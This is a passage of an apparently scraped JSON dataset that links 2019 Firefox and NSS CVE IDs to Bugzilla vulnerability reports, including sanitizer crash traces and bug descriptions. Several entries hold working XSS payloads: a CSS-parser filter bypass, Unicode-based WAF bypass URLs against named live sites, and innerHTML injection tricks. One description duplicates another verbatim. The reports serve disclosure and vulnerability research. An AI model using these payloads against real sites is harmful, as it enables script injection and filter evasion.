nsScriptSecurityManager::InitStatics() /builds/worker/workspace/build/src/caps/nsScriptSecurityManager.cpp:1465:28 #27 0x7f4331786a58 in nsXPConnect::InitStatics() /builds/worker/workspace/build/src/js/xpconnect/src/nsXPConnect.cpp:135:3 #28 0x7f43317206b8 in xpcModuleCtor() /builds/worker/workspace/build/src/js/xpconnect/src/XPCModule.cpp:11:3 #29 0x7f4338ebc2f8 in nsLayoutModuleInitialize() /builds/worker/workspace/build/src/layout/build/nsLayoutModule.cpp:106:7 #30 0x7f432fc6c0d5 in nsComponentManagerImpl::Init() /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:532:5 #31 0x7f432fd15509 in NS_InitXPCOM2 /builds/worker/workspace/build/src/xpcom/build/XPCOMInit.cpp:451:51 #32 0x7f433c0f5874 in Initialize /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:1364:8 #33 0x7f433c0f5874 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4834 #34 0x7f433c0f73b0 in XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4922:21 #35 0x55eef3d5e1ec in do_main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:214:22 #36 0x55eef3d5e1ec in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:293 #37 0x7f434f273b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/netwerk/protocol/http/Http2Stream.h:62:45 in SetHTTPState Shadow bytes around the buggy address: 0x0c288007dd80: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c288007dd90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c288007dda0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c288007ddb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa 0x0c288007ddc0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd =>0x0c288007ddd0: fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd 0x0c288007dde0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c288007ddf0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa 0x0c288007de00: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c288007de10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c288007de20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==18805==ABORTING"
      }
    ],
    "CVE-2019-11714": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1542593",
        "title": "PNeckoChild::SendPUDPSocketConstructor called off main thread",
        "description": "I observed a null pointer crash in an asan build, stack trace below. This looks very similar to #1542160 but that's already marked as fixed. (The crash happened with a build from Apr 1st). ==31446==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000001 (pc 0x7f3902c57963 bp 0x7f38e7cebb50 sp 0x7f38e7ceb9c0 T26) ==31446==The signal is caused by a WRITE memory access. ==31446==Hint: address points to the zero page. #0 0x7f3902c57962 in mozilla::ipc::IPDLParamTraits<nsIPrincipal>::Write(IPC::Message*, mozilla::ipc::IProtocol*, nsIPrincipal*) /builds/worker/workspace/build/src/dom/ipc/PermissionMessageUtils.cpp:16:3 #1 0x7f38fc6f27d9 in mozilla::net::PNeckoChild::SendPUDPSocketConstructor(mozilla::net::PUDPSocketChild*, IPC::Principal const&, nsTString<char> const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PNeckoChild.cpp:1099:5 #2 0x7f39028f120a in mozilla::dom::UDPSocketChild::Bind(nsIUDPSocketInternal*, nsIPrincipal*, nsTSubstring<char> const&, unsigned short, bool, bool, unsigned int, unsigned int, nsIEventTarget*) /builds/worker/workspace/build/src/dom/network/UDPSocketChild.cpp:92:18 #3 0x7f38fd2513e8 in mozilla::NrUdpSocketIpc::create_i(nsTSubstring<char> const&, unsigned short) /builds/worker/workspace/build/src/media/mtransport/nr_socket_prsock.cpp:1520:7 #4 0x7f38fd25e2e2 in apply<RefPtr<mozilla::NrUdpSocketIpc>, void (mozilla::NrUdpSocketIpc::*)(const nsTSubstring<char> &, unsigned short), nsTString<char>, unsigned short, 0, 1> /builds/worker/workspace/build/src/media/mtransport/runnable_utils.h:78:5 #5 0x7f38fd25e2e2 in mozilla::runnable_args_memfn<RefPtr<mozilla::NrUdpSocketIpc>, void (mozilla::NrUdpSocketIpc::*)(nsTSubstring<char> const&, unsigned short), nsTString<char>, unsigned short>::Run() /builds/worker/workspace/build/src/media/mtransport/runnable_utils.h:148 #6 0x7f38fb29c929 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #7 0x7f38fb2a2a18 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:482:10 #8 0x7f38fc2755ca in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:303:20 #9 0x7f38fc1a718f in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #10 0x7f38fc1a718f in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #11 0x7f38fc1a718f in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #12 0x7f38fb2968fa in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11 #13 0x7f3912dd55ad in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5 #14 0x7f3916004163 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x8163) #15 0x7f3915be9dee in clone (/lib/x86_64-linux-gnu/libc.so.6+0x11adee) AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV /builds/worker/workspace/build/src/dom/ipc/PermissionMessageUtils.cpp:16:3 in mozilla::ipc::IPDLParamTraits<nsIPrincipal>::Write(IPC::Message*, mozilla::ipc::IProtocol*, nsIPrincipal*) Thread T26 (mtransport) created by T6 (Socket Thread) here: #0 0x5583451e229d in pthread_create /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:210:3 #1 0x7f3912dc7613 in _PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:433:14 #2 0x7f3912db109e in PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:518:12 #3 0x7f38fb298c19 in nsThread::Init(nsTSubstring<char> const&) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:661:8 #4 0x7f38fb2a1b60 in nsThreadManager::NewNamedThread(nsTSubstring<char> const&, unsigned int, nsIThread**) /builds/worker/workspace/build/src/xpcom/threads/nsThreadManager.cpp:416:12 #5 0x7f38fb2a58b9 in NS_NewNamedThread(nsTSubstring<char> const&, nsIThread**, nsIRunnable*, unsigned int) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:135:57 #6 0x7f38fd25cec2 in mozilla::SingletonThreadHolder::AddUse() /builds/worker/workspace/build/src/media/mtransport/nr_socket_prsock.cpp:214:21 #7 0x7f38fd24de6f in GetIOThreadAndAddUse_s /builds/worker/workspace/build/src/media/mtransport/nr_socket_prsock.cpp:262:12 #8 0x7f38fd24de6f in mozilla::NrUdpSocketIpc::NrUdpSocketIpc() /builds/worker/workspace/build/src/media/mtransport/nr_socket_prsock.cpp:1086 #9 0x7f38fd25c2c0 in mozilla::NrSocketBase::CreateSocket(nr_transport_addr_*, RefPtr<mozilla::NrSocketBase>*, std::shared_ptr<mozilla::NrSocketProxyConfig> const&) /builds/worker/workspace/build/src/media/mtransport/nr_socket_prsock.cpp:2106:21 #10 0x7f38fd28629c in nr_socket_local_create /builds/worker/workspace/build/src/media/mtransport/nricectx.cpp:1132:7 #11 0x7f3907236ba2 in nr_socket_factory_create_socket /builds/worker/workspace/build/src/media/mtransport/third_party/nICEr/src/net/nr_socket.c:185:12 #12 0x7f3907236ba2 in nr_ice_get_default_address /builds/worker/workspace/build/src/media/mtransport/third_party/nICEr/src/ice/ice_ctx.c:640 #13 0x7f3907236ba2 in nr_ice_get_default_local_address /builds/worker/workspace/build/src/media/mtransport/third_party/nICEr/src/ice/ice_ctx.c:661 #14 0x7f3907235f64 in nr_ice_set_local_addresses /builds/worker/workspace/build/src/media/mtransport/third_party/nICEr/src/ice/ice_ctx.c:744:11 #15 0x7f38fd278a6b in mozilla::NrIceCtx::SetStunAddrs(nsTArray<mozilla::NrIceStunAddr> const&) /builds/worker/workspace/build/src/media/mtransport/nricectx.cpp:558:3 #16 0x7f38fd017409 in mozilla::MediaTransportHandlerSTS::StartIceGathering(bool, nsTArray<mozilla::NrIceStunAddr> const&) /builds/worker/workspace/build/src/media/webrtc/signaling/src/peerconnection/MediaTransportHandler.cpp:572:14 #17 0x7f38fd10eaa9 in apply<RefPtr<mozilla::PeerConnectionMedia>, void (mozilla::PeerConnectionMedia::*)(bool), bool, 0> /builds/worker/workspace/build/src/obj-firefox/dist/include/mtransport/runnable_utils.h:78:5 #18 0x7f38fd10eaa9 in mozilla::runnable_args_memfn<RefPtr<mozilla::PeerConnectionMedia>, void (mozilla::PeerConnectionMedia::*)(bool), bool>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/mtransport/runnable_utils.h:148 #19 0x7f38fb29c929 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #20 0x7f38fb2a2a18 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:482:10 #21 0x7f38fb540cd4 in mozilla::net::nsSocketTransportService::Run() /builds/worker/workspace/build/src/netwerk/base/nsSocketTransportService2.cpp:1013:11 #22 0x7f38fb542e7c in non-virtual thunk to mozilla::net::nsSocketTransportService::Run() /builds/worker/workspace/build/src/netwerk/base/nsSocketTransportService2.cpp #23 0x7f38fb29c929 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #24 0x7f38fb2a2a18 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:482:10 #25 0x7f38fc2755ca in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:303:20 #26 0x7f38fc1a718f in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #27 0x7f38fc1a718f in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #28 0x7f38fc1a718f in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #29 0x7f38fb2968fa in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11 #30 0x7f3912dd55ad in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5 #31 0x7f3916004163 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x8163) Thread T6 (Socket Thread) created by T0 (Web Content) here: #0 0x5583451e229d in pthread_create /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:210:3 #1 0x7f3912dc7613 in _PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:433:14 #2 0x7f3912db109e in PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:518:12 #3 0x7f38fb298c19 in nsThread::Init(nsTSubstring<char> const&) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:661:8 #4 0x7f38fb2a1b60 in nsThreadManager::NewNamedThread(nsTSubstring<char> const&, unsigned int, nsIThread**) /builds/worker/workspace/build/src/xpcom/threads/nsThreadManager.cpp:416:12 #5 0x7f38fb2a58b9 in NS_NewNamedThread(nsTSubstring<char> const&, nsIThread**, nsIRunnable*, unsigned int) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:135:57 #6 0x7f38fb53e6bc in NS_NewNamedThread<14> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:71:10 #7 0x7f38fb53e6bc in mozilla::net::nsSocketTransportService::Init() /builds/worker/workspace/build/src/netwerk/base/nsSocketTransportService2.cpp:609 #8 0x7f38fb21a948 in mozilla::xpcom::CreateInstanceImpl(mozilla::xpcom::ModuleID, nsISupports*, nsID const&, void**) /builds/worker/workspace/build/src/obj-firefox/xpcom/components/StaticComponents.cpp:8802:7 #9 0x7f38fb2515cf in CreateInstance /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:220:46 #10 0x7f38fb2515cf in nsComponentManagerImpl::GetServiceLocked((anonymous namespace)::MutexLock&, (anonymous namespace)::EntryWrapper&, nsID const&, void**) /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:1401 #11 0x7f38fb2461c5 in nsComponentManagerImpl::GetServiceByContractID(char const*, nsID const&, void**) /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:1588:10 #12 0x7f38fb25a505 in CallGetService /builds/worker/workspace/build/src/xpcom/components/nsComponentManagerUtils.cpp:61:43 #13 0x7f38fb25a505 in nsGetServiceByContractIDWithError::operator()(nsID const&, void**) const /builds/worker/workspace/build/src/xpcom/components/nsComponentManagerUtils.cpp:253 #14 0x7f38fb0c9a9e in nsCOMPtr_base::assign_from_gs_contractid_with_error(nsGetServiceByContractIDWithError const&, nsID const&) /builds/worker/workspace/build/src/xpcom/base/nsCOMPtr.cpp:91:7 #15 0x7f38fb488e4d in operator= /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:746:5 #16 0x7f38fb488e4d in InitializeSocketTransportService /builds/worker/workspace/build/src/netwerk/base/nsIOService.cpp:306 #17 0x7f38fb488e4d in mozilla::net::nsIOService::SetOffline(bool) /builds/worker/workspace/build/src/netwerk/base/nsIOService.cpp:1099 #18 0x7f38fb48794a in mozilla::net::nsIOService::Init() /builds/worker/workspace/build/src/netwerk/base/nsIOService.cpp:271:3 #19 0x7f38fb48ad8e in mozilla::net::nsIOService::GetInstance() /builds/worker/workspace/build/src/netwerk/base/nsIOService.cpp:362:9 #20 0x7f38fb2286ed in mozilla::xpcom::CreateInstanceImpl(mozilla::xpcom::ModuleID, nsISupports*, nsID const&, void**) /builds/worker/workspace/build/src/obj-firefox/xpcom/components/StaticComponents.cpp:10196:48 #21 0x7f38fb2515cf in CreateInstance /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:220:46 #22 0x7f38fb2515cf in nsComponentManagerImpl::GetServiceLocked((anonymous namespace)::MutexLock&, (anonymous namespace)::EntryWrapper&, nsID const&, void**) /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:1401 #23 0x7f38fb2461c5 in nsComponentManagerImpl::GetServiceByContractID(char const*, nsID const&, void**) /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:1588:10 #24 0x7f38fd415351 in CallGetService<nsIIOService> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsServiceManagerUtils.h:73:10 #25 0x7f38fd415351 in nsScriptSecurityManager::Init() /builds/worker/workspace/build/src/caps/nsScriptSecurityManager.cpp:1430 #26 0x7f38fd41627c in nsScriptSecurityManager::InitStatics() /builds/worker/workspace/build/src/caps/nsScriptSecurityManager.cpp:1491:28 #27 0x7f38fcdc2d48 in nsXPConnect::InitStatics() /builds/worker/workspace/build/src/js/xpconnect/src/nsXPConnect.cpp:135:3 #28 0x7f38fcd5b188 in xpcModuleCtor() /builds/worker/workspace/build/src/js/xpconnect/src/XPCModule.cpp:11:3 #29 0x7f39045f7e78 in nsLayoutModuleInitialize() /builds/worker/workspace/build/src/layout/build/nsLayoutModule.cpp:108:7 #30 0x7f38fb247335 in nsComponentManagerImpl::Init() /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:535:5 #31 0x7f38fb2f3ba9 in NS_InitXPCOM /builds/worker/workspace/build/src/xpcom/build/XPCOMInit.cpp:466:51 #32 0x7f3907117fde in XRE_InitEmbedding2(nsIFile*, nsIFile*, nsIDirectoryServiceProvider*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:196:8 #33 0x7f38fc28048d in mozilla::ipc::ScopedXREEmbed::Start() /builds/worker/workspace/build/src/ipc/glue/ScopedXREEmbed.cpp #34 0x7f3902c2fcd5 in mozilla::dom::ContentProcess::Init(int, char**) /builds/worker/workspace/build/src/dom/ipc/ContentProcess.cpp:188:13 #35 0x7f3907118ae8 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:732:21 #36 0x55834522c404 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:56:28 #37 0x55834522c404 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:263 #38 0x7f3915af309a in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2409a)"
      }
    ],
    "CVE-2019-11715": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1555523",
        "title": "Incorrect parsing of style tag leads to XSS if HTML+CSS is allowed but no JS",
        "description": "I was pentesting a web-site with a Javascript-filter. It wanted to allow HTML+CSS but no Javascript. During the assessment I found a CSS-parser bug in Firefox, where the parsing is different from other tested web browsers (Chrome/Safari) in how you terminate CSS. This trick allowed me to bypass their protection and I think it is likely it will work in other places as well. This was tested on the latest stable/regular version on OSX. PoC: https://playground.zulln.se/poc/firefoxcss.html Source code: <style></style</style><img src=\"</style><svg/onload=alert(document.domain)>\">"
      }
    ],
    "CVE-2019-11716": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1552632",
        "title": "globalThis does not appear in property names of window until specifically referenced",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Steps to reproduce: Open or refresh a page that does not reference globalThis in its scripts Open developer console and enter the following: Object.getOwnPropertyNames(window) Object.getOwnPropertyNames(window).indexOf('globalThis') window.globalThis // alternatively, simply reference globalThis Object.getOwnPropertyNames(window) Object.getOwnPropertyNames(window).indexOf('globalThis') Actual results: <- Array(909) [ \"undefined\", \"InternalError\", \"EvalError\", \"RangeError\", \"ReferenceError\", \"SyntaxError\", \"TypeError\", \"URIError\", \"ArrayBuffer\", \"Int8Array\", … ] <- -1 <- Window https://bugzilla.mozilla.org/enter_bug.cgi#h=bugForm%7CFirefox <- Array(910) [ \"undefined\", \"InternalError\", \"EvalError\", \"RangeError\", \"ReferenceError\", \"SyntaxError\", \"TypeError\", \"URIError\", \"ArrayBuffer\", \"Int8Array\", … ] <- 909 Expected results: The result of lines 2 and 3 should have matched lines 5 and 6. The array of returned property names should not have grown when globalThis was first referenced, because it should already have been present. It appears that the globalThis item is added to the very end of the property names as soon as it is referenced, but is not present before then. This is marked as a security bug because it can potentially be used to bypass JavaScript sandboxes (such as Salesforce's Locker Service) where being able to control access to the global scope is important. A script that uses Object.getOwnPropertyNames(window) to create a proxy object (which is then frozen) for use in a with() block should be able to prevent untrusted script executing within that block (if it's also within an immediately-invoked anonymous function and in strict mode) from accessing the global scope. However, if that sandboxing script doesn't explicitly reference globalThis beforehand, or explicitly attach it to its proxy object, then the untrusted script will be able to access the global scope anyhow."
      }
    ],
    "CVE-2019-11719": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1540541",
        "title": "PK11_ImportDERPrivateKeyInfoAndReturnKey causes OOB read when importing private keys with leading 0x00 bytes",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0 Steps to reproduce: The attached C program exercises the bug. To reproduce: Import a curve25519 private key in PKCS#8 format using PK11_ImportDERPrivateKeyInfoAndReturnKey, where one or more of the leading bytes of the key is 0x00. The import operation succeeds. I am importing a key in the format used here: https://searchfox.org/nss/rev/cfd5fcba7efbfe116e2c08848075240ec3a92718/gtests/pk11_gtest/pk11_curve25519_unittest.cc#66 Try to use the private key for DH key agreement (e.g., with PK11_PubDeriveWithKDF). The operation succeeds but returns an incorrect results. Furthermore, in the process, the operation makes what I believe is an OOB read. Actual results: When importing a key using PK11_ImportDERPrivateKeyInfoAndReturnKey, the import operation strips leading 0x00 bytes from the private key: https://searchfox.org/mozilla-central/source/security/nss/lib/pk11wrap/pk11pk12.c#530 Later on, when using PK11_PubDeriveWithKDF to use this secret curve25519 key to derive a DH secret, ECDH_Derive is invoked here: https://searchfox.org/mozilla-central/source/security/nss/lib/freebl/ec.c#523 I believe that ECDH_Derive then invokes ec_Curve25519_mul here: https://searchfox.org/mozilla-central/source/security/nss/lib/freebl/ecl/ecp_25519.c#l Notice that ec_Curve25519_mul assumes that the input secret s is 32 bytes long: https://searchfox.org/mozilla-central/source/security/nss/lib/freebl/ecl/curve25519_32.c#370 If the leading zeros have been truncated, then s is < 32 bytes and we will have an OOB read. In addition, the operation returns an incorrect answer. Expected results: OPTION 1: The CKA_VALUE parameter for Curve25519 keys should not have their leading 0x00 bytes stripped in when importing: https://searchfox.org/mozilla-central/source/security/nss/lib/pk11wrap/pk11pk12.c#513 There should be an assertion somewhere in this code to check that the CKA_VALUE string is exactly 32 bytes long when the key represents a Curve25519 public key. (I haven't tested it, but I suspect that the CKA_EC_POINT parameter shouldn't have it's leading 0x00 bytes stripped either.) OPTION 2: In ec_Curve25519_mul, rewrite the code to handle the case when the secret key s has length < 32 bytes. In particular, the mul code could add leading 0x00 bytes to pad the secret key up to 32 bytes."
      }
    ],
    "CVE-2019-11720": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1556230",
        "title": "Non-BMP code points that are WhiteSpace/LineTerminator when truncated to char16_t (e.g. U+4000D -> U+000D) should not be considered WhiteSpace",
        "description": "Tested On : Browser : Firefox Quantum Version 67.0 (64-bit) OS : macOS Mojave Version 10.14.5 Beta Issue: The character \"\\uD8C0\\uDC0D\" is ignored by the JS Parser. So below JS code is executable in Firefox browser. For Example : 񀀍alert񀀍(񀀍) //It is equivalent to alert() document񀀍.񀀍domain // It is equivalent to document.domain Impact: (Security Impact) : The impact is most of WAF or XSS filters are built on the basis of defined specifications of HTML and Javascript. So it is unlikely to consider the behaviour of \"\\uD8C0\\uDC0D\" character while developing any WAF. So this leaves most of existing WAF's vulnerable to XSS even though they are perfectly secure for browsers like Chrome or Safari. I have used this unexpected behaviour of Firefox to bypass few popular WAF's. Cloudflare Bypass : https://coinmarketcap.com/?<img%20src=x%20onerror=񀀍alert񀀍()> Akamai Bypass : https://www.aliexpress.com/?<img%20src=x%20onerror=񀀍alert񀀍()> The number of ways this behaviour can be exploited are endless and depends of attackers creativity. Proof Of Concept: Open console and type below Payload and see it getting executed without any error. Payload : 񀀍alert񀀍(񀀍document񀀍.񀀍domain񀀍) // It should alert \"document.domain\" property. Save below HTML code and open in Firefox browser : HTML code : <script>񀀍alert񀀍(񀀍document񀀍.񀀍domain񀀍)</script> // It should alert \"document.domain\" property."
      }
    ],
    "CVE-2019-11729": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1515342",
        "title": "Empty or malformed p256-ECDH public keys from project Wycheproof cause segfault",
        "description": "Three testcases from Project Wycheproof for p256-ECDH cause segfaults in public key verification functions. The testvector integration for p256-ECDH is not completed yet, so none of the wycheproof testvectors for p256-ECDH is runnning in CI yet. For now, the bug(s) can be reproduced by simply adding the three testcases to the testvector header file for the Curve25519 unittest. This test can handle the testvectors for p256 without any modification. <<<>>> Steps to reproduce: Checkout current version of NSS. Add testvectors attached to this bug to gtests/common/testvectors/curve25519-vectors.h Build NSS run '../dist/Debug/bin/pk11_gtest --gtest_filter=\"*Curve25519*\" ' <<<>>> Expected Result No test failures. <<<>>> Actual Result segfault produced by each of the inserted p256 testcase(s) at line https://searchfox.org/nss/rev/7bc70a3317b800aac07bad83e74b6c79a9ec5bff/lib/freebl/ec.c#451"
      }
    ],
    "CVE-2019-11733": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1565780",
        "title": "Ability to copy password from password manager without entering master password",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: You must have some passwords saved in Firefox default credentials manager with a master password. Start Firefox and enter your master password when prompted. Then open the credentials dialog from the menu. You should see your credentials list. Rich-click on one of the credentials, and try to copy the password in your clipboard. Actual results: You are prompted for your master password again. Close it without entering your master password, but the password is copied in your clipboard anyway. Expected results: Password should not have been copied in your clipboard since you did not enter the master password."
      }
    ],
    "CVE-2019-11740": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1563133%2C1573160",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: You must have some passwords saved in Firefox default credentials manager with a master password. Start Firefox and enter your master password when prompted. Then open the credentials dialog from the menu. You should see your credentials list. Rich-click on one of the credentials, and try to copy the password in your clipboard. Actual results: You are prompted for your master password again. Close it without entering your master password, but the password is copied in your clipboard anyway. Expected results: Password should not have been copied in your clipboard since you did not enter the master password."
      }
    ],
    "CVE-2019-11741": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1539595",
        "title": "Consider an origin-whitelist for early site isolation for AMO and accounts.firefox.com",
        "description": "These were factors in the sandbox escapes seen at pwn2own -- if UXSSing to them was impossible, that'd be great. This might be tractable since I don't think iframes need to work for either of them."
      }
    ],
    "CVE-2019-11744": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1562033",
        "title": "title.innerHTML = \"</title><foo>\" parses <foo> as a tag",
        "description": "When creating any element (except \"template\" and \"script\" tags) using \"document.createElement()\" and \"document.createElementNS()\" function the provided HTML code gets rendered directly. Ideally the HTML code should not get rendered until it is manually inserted into DOM using \"appendChild()\" or similar function. I tested this issue on Chrome, Opera and Safari, they do not render the HTML code directly, also the HTML specs does not explicitly states to render the HTML code directly when creating the Elements. (Reference : https://dom.spec.whatwg.org/#dom-document-createelement) For Example : document.createElement(\"AnyElementBlahBlah\").innerHTML=\"<svg/onload=alert()>\" This code would execute \"alert()\" function directly. We did not even need to insert the element in DOM. Here's another interesting example : document.createElement(\"title\").innerHTML=\"</title><svg/onload=alert()>\" Here the content of \"title\" element should not be rendered at all but we are able to escape out of \"title\" tag context by prepending a closing \"title\" tag as shown in above example. Using this trick we can render our HTML code inside \"title\" element as well and execute our Javascript code. Damn. The same flaw applies to \"document.createElementNS()\" as well. For example : document.createElementNS(\"http://www.w3.org/1999/xhtml\", \"title\").innerHTML=\"</title><svg onload=alert()>\" Impact: It can introduce XSS vulnerability to many web applications because HTML specs does not states to render HTML such a way and also the other browsers does not follow this practice so technically it would be safe to allow untrusted input like \"document.createElement(\"title\").innerHTML='UntrustedUserInput' \" as long as the input is verified before inserting it to DOM, however for Firefox that's not the case because Firefox will render the Untrusted Input directly which would lead to execution of malicious Javascript as well. Tested On : Firefox 68.0b13 (64-bit) Firefox 67.0.4 (64-bit)"
      }
    ],
    "CVE-2019-11745": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1586176",
        "title": "Out-of-bounds write when passing an output buffer smaller than the block size to NSC_EncryptUpdate",
        "description": "In NSC_EncryptUpdate, suppose that the *pulEncryptedPartLen parameter is smaller than the block size. We assume the following path through the function: ... if (crv != CKR_OK) // false ... if (!pEncryptedPart) { // false ... if (context->doPad) { // true /* deal with previous buffered data */ if (context->padDataLength != 0) { // true /* fill in the padded to a full block size */ for (...) { // this loop continues until context->padDataLength == context->blockSize // for this to happen, it's sufficient that ulPartLen >= context->blockSize // i.e., that there are at least context->blockSize bytes of input // or more precisely, this will happen when // ulPartLen + context->padDataLength >= context->blockSize } /* not enough data to encrypt yet? then return */ if (context->padDataLength != context->blockSize) { // false, due to above ... } /* encrypt the current padded data */ rv = (*context->update)(context->cipherInfo, pEncryptedPart, &padoutlen, context->blockSize, context->padBuf, context->blockSize); In the call to context->update, the fourth parameter indicates the maximum length which can be written to the output buffer pEncryptedPart. This parameter is set to be context->blockSize, even though only *pulEncryptedPartLen bytes remain in the output buffer, and we were assuming that *pulEncryptedPartLen was less than the block size. There are two ramifications of this: first, we can have a small out-of-bounds write here. The call to context->update can write up to about context->blockSize bytes off of the end of the output buffer. Second, context->update will write to the variable padoutlen indicating the number of bytes written. Supposing context->update does write the allowed maximum of context->blockSize bytes to the buffer, we will have padoutlen == context->blockSize. Then: pEncryptedPart += padoutlen; // advancing the pEncryptedPart pointer beyond the end of the buffer maxout -= padoutlen; Since maxout was initialized to be *pulEncryptedPartLen and is thus smaller than the block size in this 